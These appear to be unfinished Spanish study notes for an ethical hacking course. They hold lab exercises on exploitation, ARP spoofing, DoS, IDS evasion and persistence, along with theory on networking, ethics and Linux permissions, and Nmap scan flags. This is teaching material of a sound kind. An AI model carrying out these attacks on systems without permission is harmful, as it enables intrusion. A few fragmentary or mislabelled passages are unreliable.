# Practicas

Diseñadas para reforzar los conceptos teóricos y desarrollar habilidades prácticas


## 1. Fundamentos

1. Intro

Práctica 1.1: Investiga y escribe un informe sobre un caso de hacking ético famoso.
Analiza las técnicas utilizadas y los resultados obtenidos.

Práctica 1.2: Participa en un debate sobre la ética en el hacking.
¿Cuáles son los límites y las responsabilidades de un hacker ético?

2. Conceptos Básicos de Redes

Práctica 2.1: Configura una red local (LAN) con al menos tres dispositivos.
Documenta la topología de la red y los dispositivos utilizados.

Práctica 2.2: Utiliza herramientas como Wireshark para capturar y analizar tráfico de red.
Identifica diferentes tipos de paquetes y protocolos

3. OS

Práctica 3.1: Instala y configura una máquina virtual con Linux (preferiblemente Kali Linux).
Familiarízate con los comandos básicos y la gestión de archivos

Práctica 3.2: Configura una máquina virtual con Windows. Explora las diferencias en la gestión de usuarios y permisos entre Linux y Windows

4. Herramientas Básicas

Práctica 4.1: Instala y configura Kali Linux en una máquina virtual.
Explora el menú de herramientas y familiarízate con su interfaz.

Práctica 4.2: Utiliza Nmap para escanear una red local.
Documenta los resultados y analiza los servicios y puertos abiertos


## 2. Técnicas de Reconocimiento y Escaneo

1. Reconocimiento Pasivo

Práctica 1.1: Utiliza herramientas como Maltego para recopilar información pública sobre una empresa.
Documenta los datos obtenidos y su posible uso en un ataque

Práctica 1.2: Realiza una búsqueda de dominios y subdominios utilizando herramientas como Recon-ng.
Documenta los resultados y analiza la información obtenida

2. Reconocimiento Activo

Práctica 2.1: Utiliza Nmap para realizar un escaneo de puertos en una máquina virtual.
Documenta los resultados y analiza los servicios y versiones detectadas

Práctica 2.2: Configura un firewall en una máquina virtual y realiza un escaneo de puertos.
Observa cómo el firewall afecta los resultados del escaneo

3. Enumeración

Práctica 3.1: Utiliza herramientas como Enum4linux para enumerar información en una máquina Windows.
Documenta los resultados y analiza la información obtenida

Práctica 3.2: Utiliza herramientas como smbclient para enumerar recursos compartidos en una red.
Documenta los resultados y analiza la información obtenida


## 3. Explotación y Explotación de Vulnerabilidades

1. Explotación de Vulnerabilidades

Práctica 1.1: Utiliza Metasploit para explotar una vulnerabilidad en una máquina virtual.
Documenta los pasos seguidos y los resultados obtenidos.

Práctica 1.2: Desarrolla un exploit personalizado para una vulnerabilidad conocida.
Documenta el proceso de desarrollo y prueba el exploit en un entorno controlado 

2. Explotación de Aplicaciones Web

Práctica 2.1: Utiliza OWASP ZAP para realizar un escaneo de seguridad en una aplicación web.
Documenta las vulnerabilidades detectadas y propón soluciones

Práctica 2.2: Realiza un ataque de SQL Injection en una aplicación web vulnerable.
Documenta los pasos seguidos y los resultados obtenidos

3. Explotación de Redes  

Práctica 3.1: Realiza un ataque de ARP spoofing en una red local.
Documenta los pasos seguidos y los resultados obtenidos.

Práctica 3.2: Configura un ataque de DoS (Denial of Service) en una máquina virtual.
Observa el impacto en el rendimiento del sistema y documenta los resultados


## 4. Pruebas de Penetración Avanzadas

1. Pruebas de Penetración en Entornos Controlados

Práctica 1.1: Configura un laboratorio de pruebas con múltiples máquinas virtuales.
Realiza una prueba de penetración completa y documenta los resultados

Práctica 1.2: Utiliza herramientas de automatización como AutoPwn para realizar pruebas de penetración.
Documenta los resultados y analiza la eficiencia de la herramienta.

2. Pruebas de Penetración en Entornos Reales

Práctica 2.1: Participa en un programa de bug bounty.
Documenta los hallazgos y las recompensas obtenidas.

Práctica 2.2: Realiza una prueba de penetración en un entorno real (con permiso) y redacta un informe detallado.
Propón soluciones para las vulnerabilidades detectadas

3. Técnicas Avanzadas de Evitación y Persistencia

Práctica 3.1: Configura un sistema de detección de intrusiones (IDS) y realiza ataques para evadirlo.
Documenta las técnicas utilizadas y los resultados obtenidos.

Práctica 3.2: Implementa técnicas de persistencia en un sistema comprometido.
Documenta los pasos seguidos y las medidas de mitigación propuestas

    
## 5. Certificaciones y Práctica Profesional

1. Preparación para Certificaciones

Práctica 1.1: Realiza exámenes de práctica para la certificación CEH (Certified Ethical Hacker).
Analiza los resultados y enfócate en las áreas de mejora.

Práctica 1.2: Participa en un curso de preparación para la certificación OSCP (Offensive Security Certified Professional).
Documenta el proceso de aprendizaje y los desafíos enfrentados

2. Práctica Profesional

Práctica 2.1: Participa en CTFs (Capture The Flag) y desafíos de hacking.
Documenta los hallazgos y las técnicas utilizadas.

Práctica 2.2: Colabora en proyectos de seguridad informática.
Documenta tu contribución y los resultados obtenidos.

Práctica 2.3: Participa en comunidades de seguridad informática y comparte tus conocimientos.
Documenta las interacciones y los aprendizajes obtenidos


# Llama 

**Nivel Básico (1-3 meses)**

1. **Introducción al Hacking Ético**:
 * Definición y conceptos básicos de hacking ético
 * Tipos de hackers: black hat, white hat, gray hat
 * Importancia de la seguridad informática
2. **Fundamentos de Redes**:
 * Tipos de redes: LAN, WAN, Wi-Fi
 * Protocolos de red: TCP/IP, DNS, DHCP
 * Dispositivos de red: routers, switches, firewalls
3. **Sistemas Operativos**:
 * Windows: instalación, configuración y administración básica
 * Linux: instalación, configuración y administración básica
4. **Herramientas de Hacking**:
 * Nmap: escaneo de puertos y detección de servicios
 * Nessus: vulnerabilidad y evaluación de seguridad
 * Metasploit: framework de explotación de vulnerabilidades

**Nivel Intermedio (3-6 meses)**

1. **Análisis de Vulnerabilidades**:
 * Identificación de vulnerabilidades en sistemas operativos y aplicaciones
 * Uso de herramientas de análisis de vulnerabilidades: OpenVAS, Nessus
2. **Explotación de Vulnerabilidades**:
 * Uso de Metasploit para explotar vulnerabilidades
 * Desarrollo de exploits personalizados
3. **Seguridad de Redes**:
 * Configuración de firewalls y sistemas de detección de intrusos (IDS)
 * Implementación de VPNs y seguridad de redes inalámbricas
4. **Análisis de Malware**:
 * Tipos de malware: virus, gusanos, troyanos, ransomware
 * Análisis de malware con herramientas como OllyDbg y IDA Pro

**Nivel Avanzado (6-12 meses)**

1. **Hacking de Aplicaciones Web**:
 * Identificación de vulnerabilidades en aplicaciones web: SQL Injection, Cross-Site Scripting (XSS)
 * Uso de herramientas como Burp Suite y ZAP para testing de aplicaciones web
2. **Hacking de Redes Inalámbricas**:
 * Identificación de vulnerabilidades en redes inalámbricas: WEP, WPA, WPA2
 * Uso de herramientas como Aircrack-ng y Wireshark para análisis de redes inalámbricas
3. **Evade y Contra-Medidas**:
 * Técnicas de evasión de detección: código malicioso, steganografía
 * Implementación de contra-medidas: honeypots, sistemas de detección de intrusos
4. **Investigación y Análisis de Incidentes**:
 * Metodología para la investigación de incidentes de seguridad
 * Análisis de logs y evidencia digital

**Recursos Adicionales**

* Libros: "Hacking: The Art of Exploitation" de Jon Erickson, "Penetration Testing: A Hands-On Guide to Hacking" de Georgia Weidman
* Cursos en línea: "Hacking Ético" en Udemy, "Penetration Testing" en Cybrary
* Comunidades en línea: Reddit (r/netsec, r/hacking), Stack Overflow (seguridad)

 + Nmap

A diferencia del hacking malicioso, que tiene intenciones perjudiciales
el hacking ético se realiza con el permiso explícito del propietario del sistema
con el objetivo de fortalecer la seguridad.

Es un enfoque proactivo para la seguridad informática en el que profesionales calificados, conocidos como hackers éticos o pentesters
simulan ataques a sistemas informáticos para identificar y corregir vulnerabilidades antes de que puedan ser explotadas por actores maliciosos
Este proceso implica el uso de técnicas y herramientas similares a las que utilizan los hackers maliciosos

3. Mejora de la Seguridad:

## Diferencias entre hacking ético, hacking malicioso y seguridad informática.

### Hacking Ético

También conocido como "ethical hacking" o "penetration testing", es la práctica de identificar y explotar vulnerabilidades en sistemas
redes y aplicaciones con el propósito de mejorar su seguridad

Legalidad:

Se realiza con el permiso explícito del propietario del sistema.
Está regulado por contratos y acuerdos legales.


### Hacking Malicioso

También conocido como "black hat hacking", es la práctica de identificar y explotar vulnerabilidades en sistemas, redes y aplicaciones
con la intención de causar daño, robar información o obtener beneficios ilícitos.
Se realiza sin el permiso del propietario del sistema y con intenciones perjudiciales

Objetivos:

Obtener acceso no autorizado a sistemas y datos.
Robar información sensible, como datos personales, financieros o comerciales.
Causar daño a sistemas y redes, como interrupciones de servicio o destrucción de datos.
Obtener beneficios económicos a través de actividades ilícitas, como el robo de identidad o el fraude

Métodos:

Uso de técnicas y herramientas para explotar vulnerabilidades.
Realización de ataques como phishing, malware, y ataques de denegación de servicio (DoS).
Evasión de sistemas de detección y prevención de intrusiones

Legalidad:

Se realiza sin el permiso del propietario del sistema.
Es ilegal y puede resultar en sanciones legales y penales.


### Seguridad Informática

"Cybersecurity" o "IT security", es el conjunto de prácticas, tecnologías y políticas diseñadas para proteger sistemas, redes y datos contra ataques, daños o accesos no autorizados.
Incluye la prevención, detección y respuesta a amenazas de seguridad

Objetivos:

Proteger la integridad, confidencialidad y disponibilidad de los sistemas y datos.
Prevenir accesos no autorizados y ataques.
Detectar y responder a incidentes de seguridad.
Asegurar el cumplimiento de normativas y regulaciones de seguridad.
Fomentar una cultura de seguridad dentro de la organización

Métodos:

Implementación de firewalls, sistemas de detección de intrusiones (IDS) y sistemas de prevención de intrusiones (IPS).
Uso de software antivirus y antimalware.
Realización de auditorías de seguridad y evaluaciones de riesgos.
Capacitación y concienciación del personal en prácticas seguras.
Desarrollo e implementación de políticas de seguridad.

Legalidad:

Está regulado por normativas y regulaciones de seguridad.
Incluye la colaboración con hackers éticos para mejorar la seguridad


## Ética y legalidad

Principios y valores que guían la conducta de los hackers éticos. Estos principios aseguran que las actividades de hacking se realicen de manera responsable y con el bienestar de la organización y sus usuarios en mente.

### Principios Éticos:

Consentimiento Informado:
Definición: Obtener el permiso explícito y por escrito del propietario del sistema antes de realizar cualquier prueba de penetración.
Importancia: Asegura que las actividades de hacking ético sean legales y que el propietario del sistema esté consciente de las pruebas que se realizarán.

Transparencia:
Definición: Ser transparente sobre las técnicas y herramientas utilizadas durante las pruebas de penetración.
Importancia: Ayuda a construir confianza y asegura que el propietario del sistema entienda los hallazgos y las recomendaciones.

Responsabilidad:
Definición: Actuar de manera responsable y profesional, evitando causar daños innecesarios o interrupciones en los sistemas.
Importancia: Asegura que las pruebas de penetración no afecten negativamente la operación normal del sistema.

Confidencialidad:
Definición: Mantener la confidencialidad de la información obtenida durante las pruebas de penetración.
Importancia: Protege la información sensible y mantiene la confianza del propietario del sistema.

Integridad:
Definición: Actuar con integridad y honestidad, reportando todos los hallazgos de manera precisa y completa.
Importancia: Asegura que las recomendaciones sean efectivas y que el propietario del sistema pueda tomar medidas adecuadas para corregir las vulnerabilidades.


### Legalidad en el Hacking Ético

La legalidad en el hacking ético se refiere al cumplimiento de las leyes y regulaciones que gobiernan las actividades de hacking. Aunque el hacking ético es legal cuando se realiza con el permiso del propietario del sistema, es crucial seguir las normativas y regulaciones aplicables.

Aspectos Legales:

Contratos y Acuerdos:
Definición: Firmar contratos y acuerdos legales que especifiquen los términos y condiciones de las pruebas de penetración.
Importancia: Asegura que ambas partes estén de acuerdo sobre el alcance, los límites y las responsabilidades de las pruebas de penetración.

Normativas y Regulaciones:
Definición: Cumplir con las normativas y regulaciones de seguridad aplicables, como el GDPR, HIPAA, y otras leyes de protección de datos.
Importancia: Asegura que las actividades de hacking ético no violen las leyes y regulaciones, y que la información sensible esté protegida.

Responsabilidad Legal:
Definición: Ser consciente de las responsabilidades legales y las posibles consecuencias de las acciones realizadas durante las pruebas de penetración.
Importancia: Asegura que el hacker ético actúe de manera responsable y evite acciones que puedan resultar en sanciones legales.

Documentación:
Definición: Documentar todas las actividades, hallazgos y recomendaciones de manera detallada y precisa.
Importancia: Proporciona una base sólida para la toma de decisiones y asegura que el propietario del sistema pueda tomar medidas adecuadas para corregir las vulnerabilidades.


### Código de Ética del Hacker Ético

Muchas organizaciones y certificaciones en hacking ético, como la Certified Ethical Hacker (CEH) de EC-Council, tienen un código de ética que los profesionales deben seguir. Este código de ética generalmente incluye los siguientes principios:

Actuar con Integridad:
Mantener altos estándares de integridad y honestidad en todas las actividades de hacking ético.

Proteger la Información:
Proteger la confidencialidad y la integridad de la información obtenida durante las pruebas de penetración.

Respetar la Privacidad:
Respetar la privacidad de los individuos y las organizaciones, y evitar el uso indebido de la información obtenida.

Actuar con Responsabilidad:
Actuar de manera responsable y profesional, evitando causar daños innecesarios o interrupciones en los sistemas.

Cumplir con la Ley:
Cumplir con todas las leyes y regulaciones aplicables, y actuar dentro de los límites legales establecidos



## Fundamentos de redes: TCP/IP, protocolos, direccionamiento IP.

Base necesaria para entender cómo funcionan las redes
identificar vulnerabilidades y realizar pruebas de penetración efectivas

### 1. Modelo OSI (Open Systems Interconnection)

##### Marco de referencia que describe cómo los datos se transmiten a través de una red.

1. Capa Física (Layer 1):
Se encarga de la `transmisión de bits` a través de un medio físico
`(cables, fibra óptica, etc)`.

Importancia en Hacking Ético:
Comprender esta capa es crucial para realizar
`ataques físicos y entender la infraestructura de red`

2. Capa de Enlace de Datos (Layer 2):
Gestiona el `acceso al medio y la detección de errores en la transmisión de datos`.

Importancia en Hacking Ético:
Técnicas como `ARP spoofing` y `ataques de man-in-the-middle (MITM)` se realizan en esta capa
    
3. Capa de Red (Layer 3):
Se encarga del `enrutamiento de paquetes` entre diferentes redes.

Importancia en Hacking Ético:
Comprender el `enrutamiento IP` y las `tablas de enrutamiento` es esencial
para realizar `ataques de red y escaneo de puertos`.

4. Capa de Transporte (Layer 4):
Asegura la entrega confiable de datos entre dispositivos.

Importancia en Hacking Ético:
Protocolos como `TCP y UDP` son fundamentales para entender
cómo se transmiten los datos y cómo se pueden interceptar

5. Capa de Sesión (Layer 5):
Gestiona la creación, mantenimiento y terminación de `sesiones de comunicación`.

Importancia en Hacking Ético: Comprender las sesiones de comunicación es crucial
para realizar `ataques de sesión y mantener el acceso a sistemas comprometidos`

6. Capa de Presentación (Layer 6):
Traduce datos entre el formato de la aplicación y un formato adecuado para la red.

Importancia en Hacking Ético:
Comprender la `codificación y decodificación de datos` es esencial
para realizar `ataques de ingeniería inversa y análisis de tráfico`

7. Capa de Aplicación (Layer 7):
Proporciona servicios de red a las aplicaciones de usuario final.

Importancia en Hacking Ético:
Comprender los `protocolos de aplicación (HTTP, FTP, SMTP, etc.)` es crucial
para realizar `ataques de aplicación web y análisis de tráfico`

Importancia en Hacking Ético:

Importancia en Hacking Ético:
Comprender DNS es esencial para realizar
ataques de `envenenamiento de DNS` y análisis de tráfico de red

4. SMTP/IMAP/POP3 (Simple Mail Transfer Protocol/Internet Message Access Protocol/Post Office Protocol):

Importancia en Hacking Ético:

ataques de `phishing` y análisis de `tráfico de correo electrónico`

## Topologías de red y dispositivos de red (routers, switches, firewalls).

### Topologías de red

Describen la disposición física y lógica de los dispositivos en una red

##### cada topología tiene sus propias características, ventajas y desventajas
##### puede afectar la forma en que se realizan las pruebas de penetración y los ataques

1. Estrella
todos los dispositivos están conectados a un punto central
como un switch o un router
Este punto central actúa como un intermediario para la comunicación entre los dispositivos

Ventajas:

Facilidad de gestión: Es más fácil agregar o eliminar dispositivos.
Facilidad de diagnóstico: Es más fácil identificar problemas en la red.
Seguridad: Es más fácil implementar medidas de seguridad centralizadas.

Desventajas:

Punto único de fallo: Si el punto central falla, toda la red se ve afectada.
Costo: Puede ser más costoso debido a la necesidad de un punto central

en Hacking Ético:

Escaneo de Red: Es más `fácil realizar escaneos` de red y análisis de tráfico debido a la centralización
Ataques de Red: Los ataques pueden ser `más efectivos` si se compromete el punto central
Seguridad: Es más `fácil implementar y probar medidas de seguridad centralizadas`, como firewalls y sistemas de detección de intrusiones (IDS).


2. Todos los dispositivos están conectados a un único cable de comunicación
Los datos se transmiten a lo largo del cable y son recibidos por todos los dispositivos conectados

Ventajas:

Costo: Es más económico debido a la menor cantidad de cableado.
Facilidad de implementación: Es más fácil de implementar en redes pequeñas

Desventajas:

Problemas de colisión: Los datos pueden colisionar si dos dispositivos intentan transmitir al mismo tiempo.
Dificultad de diagnóstico: Es más difícil identificar problemas en la red.
Punto único de fallo: Si el cable principal falla, toda la red se ve afectada

en Hacking Ético:

Escaneo de Red: Es `más difícil` realizar escaneos de red y análisis de tráfico debido a la falta de centralización.
Ataques de Red: Los ataques pueden ser `más efectivos` si se compromete el cable principal.
Seguridad: Es más difícil implementar y probar medidas de seguridad centralizadas.


3. Anillo
Cada dispositivo está conectado a dos otros dispositivos, formando un anillo
Los datos se transmiten en una sola dirección alrededor del anillo

Ventajas:

Eficiencia: Los datos se transmiten de manera eficiente sin colisiones.
Facilidad de gestión: Es más fácil gestionar la red debido a la estructura en anillo

Desventajas:

Dificultad de implementación: Es más difícil de implementar en redes grandes.
Punto único de fallo: Si un dispositivo falla, toda la red se ve afectada.
Costo: Puede ser más costoso debido a la necesidad de más cableado

en Hacking Ético:

Escaneo de Red: Es `más fácil realizar` escaneos de red y análisis de tráfico debido a la estructura en anillo.
Ataques de Red: Los ataques pueden ser `más efectivos` si se compromete un dispositivo en el anillo.
Seguridad: Es más `fácil implementar` y probar medidas de seguridad centralizadas.


4. Malla/Mesh
Cada dispositivo está conectado a todos los otros dispositivos en la red
Esto crea múltiples rutas de comunicación entre los dispositivos

Ventajas:

Redundancia: Hay múltiples rutas de comunicación, lo que aumenta la redundancia y la fiabilidad.
Facilidad de diagnóstico: Es más fácil identificar problemas en la red.
Seguridad: Es más difícil para un atacante comprometer toda la red.

Desventajas:

Costo: Es más costoso debido a la necesidad de más cableado.
Complejidad: Es más complejo de implementar y gestionar.

en Hacking Ético:

Escaneo de Red: Es `más difícil` realizar escaneos de red y análisis de tráfico debido a la complejidad.
Ataques de Red: Los ataques pueden ser `más difíciles` de realizar debido a la redundancia.
Seguridad: Es más difícil comprometer toda la red, pero es más fácil implementar y probar medidas de seguridad centralizadas.


5. Árbol/Tree
Los dispositivos están organizados en una estructura jerárquica, similar a un árbol
Hay un dispositivo raíz y varios niveles de dispositivos hijos

Ventajas:

Escalabilidad: Es más fácil escalar la red agregando nuevos dispositivos.
Facilidad de gestión: Es más fácil gestionar la red debido a la estructura jerárquica.
Seguridad: Es más fácil implementar y probar medidas de seguridad centralizadas

Desventajas:

Punto único de fallo: Si el dispositivo raíz falla, toda la red se ve afectada.
Costo: Puede ser más costoso debido a la necesidad de más cableado.

en Hacking Ético:

Escaneo de Red: Es `más fácil` realizar escaneos de red y análisis de tráfico debido a la estructura jerárquica.
Ataques de Red: Los ataques pueden ser `más efectivos` si se compromete el dispositivo raíz.
Seguridad: Es más fácil implementar y probar medidas de seguridad centralizadas


6. Topología Híbrida
Combina dos o más topologías de red
Por ejemplo, una red puede tener una topología en estrella para la red local y una topología en malla para la red de respaldo

Ventajas:

Flexibilidad: Permite combinar las ventajas de diferentes topologías.
Escalabilidad: Es más fácil escalar la red agregando nuevos dispositivos.
Seguridad: Permite implementar medidas de seguridad centralizadas y distribuidas
    
Desventajas:

Complejidad: Es más complejo de implementar y gestionar.
Costo: Puede ser más costoso debido a la necesidad de más cableado y dispositivos

en Hacking Ético:

Escaneo de Red: Es `más difícil` realizar escaneos de red y análisis de tráfico debido a la complejidad.
Ataques de Red: Los ataques pueden ser `más difíciles` de realizar debido a la combinación de topologías.
Seguridad: Permite implementar y probar medidas de seguridad centralizadas y distribuidas

Los hackers éticos pueden identificar vulnerabilidades, realizar escaneos de red y análisis de tráfico, y probar medidas de seguridad de manera más efectiva    


### Dispositivos de red

##### Componentes esenciales que facilitan la comunicación y el intercambio de datos en una red.
comprender estos dispositivos es crucial para identificar vulnerabilidades
realizar pruebas de penetración y mejorar la seguridad de la red

1. Routers/Enrutadores
Dispositivos que enrutan paquetes de datos entre diferentes redes
Deciden el mejor camino para que los datos viajen desde el origen hasta el destino

Funciones Principales:

`Enrutamiento`: Determina la mejor ruta para los paquetes de datos.
`Direccionamiento IP`: Asigna direcciones IP a los dispositivos en la red.
`Seguridad`: Puede incluir firewalls y sistemas de detección de intrusiones (IDS).

en Hacking Ético:

Escaneo de Red: Los routers pueden ser `objetivos de escaneos de red para identificar vulnerabilidades`.
Ataques de Red: Los routers pueden ser `comprometidos para redirigir el tráfico de red o realizar ataques de hombre en el medio (MITM)`.
Seguridad: Es crucial asegurar los routers para `prevenir accesos no autorizados y ataques de red`


2. Switches/Conmutadores
Dispositivos que conectan dispositivos en una red local (LAN)
Gestionan el tráfico de datos entre ellos

Funciones Principales:

`Conmutación`: Envia los datos solo al dispositivo de destino.
`Gestión de VLANs`: Permite la creación de redes virtuales (VLANs) para segmentar la red.
`Seguridad`: Puede incluir características de seguridad como el control de acceso a puertos (PAC).

en Hacking Ético:

Escaneo de Red: Los switches pueden ser objetivos de escaneos de red para `identificar dispositivos conectados`.
Ataques de Red: Los switches pueden ser comprometidos para `interceptar el tráfico de red o realizar ataques de ARP spoofing`.
Seguridad: Es crucial asegurar los switches para `prevenir accesos no autorizados y ataques de red`.


3. Firewalls/Cortafuegos
Dispositivos que filtran el tráfico de red entrante y saliente basado en reglas de seguridad predefinidas

Funciones Principales:

`Filtración de Tráfico`: Permite o `bloquea el tráfico` basado en reglas de seguridad.
`Seguridad`: `Protege la red` contra ataques de red y accesos no autorizados.
`Registro`: Registra el `tráfico de red para análisis y auditoría`

en Hacking Ético:

`Pruebas de Penetración`: Los firewalls pueden ser objetivos de pruebas de penetración para `identificar vulnerabilidades`.
`Ataques de Red`: Los firewalls `pueden ser comprometidos para evitar la detección de ataques de red`.
`Seguridad`: Es crucial asegurar los firewalls para `prevenir accesos no autorizados y ataques de red`


4. IDS/IPS (Intrusion Detection System/Intrusion Prevention System)
Son sistemas que detectan y previenen actividades maliciosas en una red.

Funciones Principales:

`Detección`: Detecta `actividades sospechosas o maliciosas en la red`.
Prevención: Puede tomar `medidas` para prevenir ataques de red.
Registro: `Registra las actividades detectadas para análisis y auditoría`

en Hacking Ético:

Pruebas de Penetración: Los IDS/IPS pueden ser `objetivos de pruebas de penetración` para identificar vulnerabilidades.
Ataques de Red: Los IDS/IPS `pueden ser comprometidos para evitar la detección de ataques de red`.
Seguridad: Es crucial asegurar los IDS/IPS para `prevenir accesos no autorizados y ataques de red`.


5. Access Points/Puntos de Acceso 
Dispositivos que permiten a los dispositivos inalámbricos conectarse a una red.

Funciones Principales:

`Conectividad Inalámbrica`: Permite la conexión de dispositivos inalámbricos a la red.
Seguridad: Puede incluir características de seguridad como el cifrado `WPA2/WPA3`.
Gestión: Permite la `gestión de la red inalámbrica y los dispositivos conectados`

en Hacking Ético:

Escaneo de Red: Los puntos de acceso pueden ser objetivos de `escaneos de red para identificar vulnerabilidades`.
Ataques de Red: Los puntos de acceso `pueden ser comprometidos para interceptar el tráfico de red o realizar ataques de red inalámbrica`.
Seguridad: Es crucial asegurar los puntos de acceso para prevenir accesos no autorizados y ataques de red.


6. Modems
Dispositivos que permiten la conexión a Internet a través de líneas telefónicas, cables o conexiones inalámbricas

Conectividad: Permite la conexión a Internet.
`Modulación/Demodulación`: Convierte datos digitales en señales analógicas y viceversa.
Seguridad: Puede incluir `características de seguridad como el cifrado y el control de acceso`

Hacking Ético:

Escaneo de Red: Los modems pueden ser objetivos de escaneos de red para identificar vulnerabilidades.
Ataques de Red: Los modems pueden ser comprometidos para interceptar el tráfico de red o realizar ataques de red.
Seguridad: Es crucial asegurar los modems para prevenir accesos no autorizados y ataques de red


7. Proxies (Servidores Proxy)
Actúan como intermediarios entre los clientes y los servidores, gestionando las solicitudes de red

Funciones Principales:

Intermediación: Actúa como intermediario entre los clientes y los servidores.
`Caché`: Almacena copias de páginas web para mejorar el rendimiento.
Seguridad: Puede incluir `características de seguridad como el filtrado de contenido y el control de acceso`

en Hacking Ético:

Pruebas de Penetración: Los servidores proxy pueden ser objetivos de pruebas de penetración para identificar vulnerabilidades.
Ataques de Red: Los servidores proxy pueden ser comprometidos para `interceptar el tráfico de red o realizar ataques de red`.
Seguridad: Es crucial asegurar los servidores proxy para prevenir accesos no autorizados y ataques de red


8. Load Balancers/Balanceadores de Carga
Distribuyen el tráfico de red entre múltiples servidores para mejorar el rendimiento y la disponibilidad
  
Funciones Principales:

Distribución de Tráfico: Distribuye el tráfico de red entre múltiples servidores.
`Equilibrio de Carga`: Asegura que `ningún servidor esté sobrecargado`.
Seguridad: Puede incluir `características de seguridad como el filtrado de tráfico y el control de acceso`

en Hacking Ético:

Pruebas de Penetración: Los balanceadores de carga pueden ser objetivos de pruebas de penetración para identificar vulnerabilidades.
Ataques de Red: Los balanceadores de carga pueden ser comprometidos para interrumpir el tráfico de red o realizar ataques de red.
Seguridad: Es crucial asegurar los balanceadores de carga para prevenir accesos no autorizados y ataques de red
        

## Conceptos básicos de seguridad en redes

##### Proporcionan la base necesaria para identificar vulnerabilidades, realizar pruebas de penetración y mejorar la seguridad de los sistemas y datos

1. Confidencialidad
Protección de la información contra el acceso no autorizado.
Asegura que solo las personas autorizadas puedan acceder a la información

en Hacking Ético:

Identificación de Vulnerabilidades:
Los hackers éticos `buscan vulnerabilidades` que puedan comprometer la confidencialidad de la información.

Pruebas de Penetración:
Se realizan pruebas para `evaluar la efectividad de las medidas de confidencialidad`
como el `cifrado y el control de acceso`.


2. Integridad
Se refiere a la protección de la información contra modificaciones no autorizadas
Asegura que la información no sea alterada de manera no autorizada

Hacking Ético:

Identificación de Vulnerabilidades: Los hackers éticos `buscan vulnerabilidades` que puedan comprometer la integridad de la información.

Pruebas de Penetración:
Se realizan pruebas para `evaluar la efectividad de las medidas` de integridad
como las `firmas digitales y los hash`.


3. Disponibilidad
Garantía de que los recursos y servicios estén disponibles cuando se necesiten
Asegura que los sistemas y datos estén accesibles y operativos

Hacking Ético:

Identificación de Vulnerabilidades:
Los hackers éticos buscan vulnerabilidades
`que puedan comprometer la disponibilidad` de los sistemas y servicios.

Pruebas de Penetración:
Se realizan pruebas para evaluar la `efectividad de las medidas` de disponibilidad,
como la `redundancia y el equilibrio de carga`


4. Autenticación
Verificar la identidad de los usuarios y dispositivos
Solo las personas y dispositivos autorizados puedan acceder a los recursos y servicios

Los hackers éticos buscan vulnerabilidades en los mecanismos de autenticación
Se realizan pruebas para evaluar la efectividad de las medidas de autenticación
como las contraseñas, las `claves públicas y los certificados digitales`.


5. Autorización
Permisos y accesos de los usuarios y dispositivos
Asegura que los usuarios y dispositivos solo puedan acceder a los recursos y servicios para los que están autorizados

Los hackers éticos buscan vulnerabilidades en los mecanismos de autorización
Se realizan pruebas para evaluar la efectividad de las medidas de autorización
como las `políticas de control de acceso y los roles de usuario`


6. Cifrado

### Permisos

##### Mecanismo fundamental para controlar el acceso a archivos y directorios
Determinan quién puede leer, escribir o ejecutar un archivo o directorio

1. Tipos de Permisos:

`Lectura (r)`: Permite leer el contenido del archivo o listar el contenido del directorio.
`Escritura (w)`: Permite modificar el contenido del archivo o agregar, eliminar o renombrar archivos en el directorio.
`Ejecución (x)`: Permite ejecutar el archivo como un programa o acceder al directorio (entrar en él).

2. Clases de Usuarios:

`Propietario (u)`: El usuario que posee el archivo.
`Grupo (g)`: El grupo al que pertenece el archivo.
`Otros (o)`: Todos los demás usuarios


Visualización de Permisos:

Para ver los permisos de un archivo o directorio, puedes usar el comando ls -l.

```
ls -l archivo.txt
```

La salida será algo similar a esto:

```
-rw-r--r-- 1 usuario grupo 1234 Jan 1 12:34 archivo.txt
```

La primera parte `(-rw-r--r--)` muestra los permisos del archivo.

##### El primer carácter indica el tipo de archivo:

`-` para un archivo regular.
`d` para un directorio.
`l` para un enlace simbólico.

Los siguientes nueve caracteres se dividen en tres grupos de tres:

`usuario grupo 1234`

Los primeros tres caracteres son para el `propietario`.
Los siguientes tres caracteres son para el `grupo`.
Los últimos tres caracteres son para `otros`
    
Cambio de Permisos

Usando chmod:

##### Modo Simbólico: Utiliza símbolos para agregar, eliminar o establecer permisos

```
chmod u+rwx archivo.txt   # Añade permisos de lectura, escritura y ejecución para el propietario
chmod g-w archivo.txt    # Elimina el permiso de escritura para el grupo
chmod o=x archivo.txt    # Establece solo el permiso de ejecución para otros

```	

##### Modo Numérico: Utiliza una notación numérica donde cada permiso tiene un valor:

Lectura (r) = 4
Escritura (w) = 2
Ejecución (x) = 1

```
chmod 755 archivo.txt   # Propietario: rwx, Grupo: r-x, Otros: r-x
chmod 644 archivo.txt   # Propietario: rw-, Grupo: r--, Otros: r--

```




Cambio de Propietario y Grupo:

Usando `chown`: 

```
chown nuevo_propietario archivo.txt   # Cambia solo el propietario
chown nuevo_propietario:nuevo_grupo archivo.txt   # Cambia el propietario y el grupo
```

Usando `chgrp`:

```
chgrp nuevo_grupo archivo.txt   # Cambia solo el grupo

```   


Permisos Especiales:

1. Bit SUID (Set User ID):

Permite que un archivo se ejecute con los privilegios del propietario del archivo.
Se representa con un s en el lugar del bit de ejecución del propietario

2. Bit SGID (Set Group ID):

Permite que un archivo se ejecute con los privilegios del grupo del archivo.
Se representa con un s en el lugar del bit de ejecución del grupo.

3. Sticky:

Solo aplicable a directorios.
Permite que solo el propietario del archivo pueda eliminar o renombrar archivos dentro del directorio, incluso si tiene permisos de escritura.
Se representa con un t en el lugar del bit de ejecución de otros.

### Introducción a herramientas como Nmap, Wireshark, Metasploit

#### 1.Nmap

Nmap (Network Mapper)
##### Herramienta de código abierto para descubrimiento de hosts y escaneo de puertos
##### usada para mapear redes, identificar servicios y obtener información sobre sistemas objetivo

pentesting:

Descubrimiento de hosts activos (host discovery).
Identificación de puertos abiertos y servicios.
Detección de versiones y sistemas operativos.
Soporte para scripts (NSE) para detección de vulnerabilidades y automatización de tareas


##### Modos y tipos de escaneo relevantes:

Ping sweep (host discovery): detectar máquinas vivas en una red.
`Ejemplo: nmap -sn 192.168.1.0/24`

Escaneo TCP SYN ("half-open") — rápido y discreto:
`-sS`

Escaneo TCP connect (cuando no hay privilegios):
`-sT`

Escaneo UDP:
`-sU (más lento y ruidoso)`

Escaneo de versión de servicio:
`-sV (intenta identificar software y versión)`

Detección de sistema operativo:
`-O (requiere más paquetes y permisos)`

Escaneo de puertos específicos o rangos:
